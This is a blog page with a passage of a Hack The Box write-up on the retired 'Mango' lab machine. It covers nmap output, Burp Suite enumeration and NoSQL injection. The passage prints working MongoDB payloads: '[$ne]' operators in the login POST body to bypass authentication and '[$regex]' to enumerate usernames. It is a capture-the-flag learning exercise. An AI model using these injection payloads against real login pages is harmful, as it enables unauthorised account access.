<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Mango 
        
    </title>
    <!-- Spectre.css framework 
    this makes the commands and protocols/ips in red -->
    <link rel="stylesheet" href="/css/spectre.min.css">
    <link rel="stylesheet" href="/css/spectre-exp.min.css">
    <link rel="stylesheet" href="/css/spectre-icons.min.css">
    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js//book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">



    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>InfoSecBlog</span>
  </a>
</div>
    <div class="book-menu">
  <ul>


    <li><a href="/">Home</a></li>
  </ul>
  <h2 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h2><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
  
    <li><a href="/htb/mango/">Hack The Box: Mango</a></li>

  </ul>
  </div>
  

<script src="/js//book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">

<!-- BEGIN YOUR WRITEUP HERE-->

<h1 id="Hack-The-Box-AI"><a href="#Hack-The-Box-AI" class="headerlink" title="Hack The Box - Mango"></a>Hack The Box - Mango</h1>
  
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Brief Summary"></a>Brief Summary</h2>

<p>
  Hello, this is my first writeup and it's going to be about HackTheBox: Mango machine. The box is retired now which means we can talk about it publicly. I personally enjoyed playing mango machine, I learned new stuff and had fun.<br></br>
  
  <img src="/images/hackthebox/mango/machine.png" alt="">

</p>


<h2 id="Nmap"><a href="#Nmap" class="headerlink" title=" Nmap"></a>Nmap</h2>
<p>Starting off, with  <code>nmap</code> to get an idea about the machine and the services running. <code>nmap 10.10.10.162 -A</code> will provide us with os detection, versions of serviecs running if applicable and traceroute of the target. </p>


<figure class=highlight python><pre><gutter> 
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Starting Nmap</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>7.80</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>https</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>://</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>nmap.org</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#7FFF79;'>at</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2020</span><span style='font-size:14px;font-family:"Andale Mono";color:#FD8285;'>-05-27</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>20</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>40</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>03</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Nmap scan report</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#86AFFF;'>for</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>10.10.10.162</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Host is up</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>0.096</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>s latency</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>.</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Not shown</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>997</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>closed ports</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>PORT &nbsp; &nbsp; STATE SERVICE &nbsp;VERSION</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>22</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>tcp &nbsp; open</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#7FFF79;'>ssh</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>OpenSSH</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>7.6</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>p1 Ubuntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>4u</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>buntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>0.3</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Ubuntu Linux</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>;</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>protocol</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2.0</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>ssh-hostkey</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp; &nbsp;&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2048</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>RSA</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp; &nbsp;&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>256&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>cf</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>ECDSA</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>256&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>ED25519</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>80</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>tcp &nbsp; open &nbsp;http &nbsp; &nbsp; Apache httpd</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2.4.29</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>((</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Ubuntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>))</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_http-server-header</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Apache</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2.4.29</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Ubuntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_http-title</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>403</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Forbidden</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>443</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>tcp open &nbsp; ssl</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>http Apache httpd</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2.4.29</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>((</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Ubuntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>))</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_http-server-header</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Apache</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2.4.29</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Ubuntu</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_http-title</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Mango</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Search Base</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>ssl-cert</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Subject</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>commonName</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>staging-order.mango.htb</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>organizationName</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Mango Prv Ltd.</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>stateOrProvinceName</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>None</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>countryName</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>IN</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Not valid before</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2019</span><span style='font-size:14px;font-family:"Andale Mono";color:#FD8285;'>-09-27T14</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>21</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>19</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_Not valid after</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>2020</span><span style='font-size:14px;font-family:"Andale Mono";color:#FD8285;'>-09-26T14</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>21</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>19</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_ssl-date</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>TLS randomness does not represent</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#86AFFF;'>time</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>tls-alpn</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>|</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>_ &nbsp; http</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>1.1</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Service Info</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>OS</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Linux</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>;</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>CPE</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>cpe</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>o</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>linux</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>linux_kernel</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Service detection performed. Please report any incorrect results</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#7FFF79;'>at</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>https</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>://</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>nmap.org</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>submit</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>/</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>.</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>Nmap</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#86AFFF;'>done</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>1</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>IP address</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>1</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#7FFF79;'>host</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>up</span><span style='font-size:14px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>scanned</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#86AFFF;'>in</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#84E158;'>29.15</span><span style='font-size:14px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:14px;font-family:"Andale Mono";color:#D0D0D0;'>seconds</span></p>
</gutter></pre></figure><br>
<p> from the output of nmap, we can note that there is a web application running on port 80/443 and has a certificate with a domain name registered as <code>staging-order.mango.htb</code> </p>


<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title=" Enumeration"></a>Enumeration</h2>
<p> when i visited port <code>80</code> i got Forbidden response from server. So i visited port <code>443</code> instead.
  but the page didnt load completely, the broweser notified me for connection not secured, which is weird. So i looked to into the certificate and found this domain <code>staging-order.mango.htb </code> mango that got caught previously with nmap.

    i accepted the risk and continued. The page loaded completely:
    <img src="/images/hackthebox/mango/2.png" alt="">
    the search engine doesn't work yet. and 'Analytics' was a rabit hole believe me. i spent hours and got put with nothing.
    lets start burp suite, and intrecpt the traffic. First thing i will do, is to add the hostname resolution rule in burp -> project options -> connections.
<br></br>
    <img src="/images/hackthebox/mango/3.png" alt=""><br>
  
  this time i visited the new domain, and found a login page. intresting...


  <br></br><img src="/images/hackthebox/mango/4.png" alt="">

    lots of mangos appearently. the machine name and these pictures. 
    
    
    Lets fuzz the login page little bit with different sql injection techniques. We should also include NoSql. Since you know, MongoDB is one of popular Databases and the box name is some how rhyme with it.
    <br></br>
    <h2 id="NoSql Injection & More Enumeratation"><a href="#NoSql Injection & More Enumeratation" class="headerlink" title="NoSql Injection & More Enumeratation"></a>NoSql Injection & More Enumeratation</h2>
  
    lets capture the login request with <code>Burp Suite</code>, and send it to repteater.

    <br></br><img src="/images/hackthebox/mango/5.png" alt=""><br>
    
    After trying many things, and looking online for useful articles about slqi on MongoDB. Found this <a>https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a>.

<br> </br>And The way to inject the parameters will be like <br></br>
    
    original POST data: 
    
    <code>username=admin&password=&login=login</code>
    
    <br>injected with NoSql attack: 

    <code>username<a style="color:red"> [$ne]</a>=admin&password<a style="color:red"> [$ne]</a>=&login=login</code>

    <br></br>
    By using <code>[$ne]</code> we specify that stored data in the DB should not be equal to our input.

    <br>here we have a redirection.

    </br><img src="/images/hackthebox/mango/6.png" alt=""><br>

    following that a successful login.

    <br></br><img src="/images/hackthebox/mango/7.png" alt=""><br>

    but it looks like the page is not completed yet and it has username/email <code> admin@mango.htb</code> . Anyway lets enumerate more usernames. 
    <br>By using <code>[$regex]</code> we tell the server to use 'Regular Expressing' for our input and search for it in the database.
  </br>Enumerating the login page with
    <code>username<a style="color:red"> [$regex]</a>=<a style="color:red">^a</a>&password<a style="color:red">[$ne]</a>=&login=login</code>
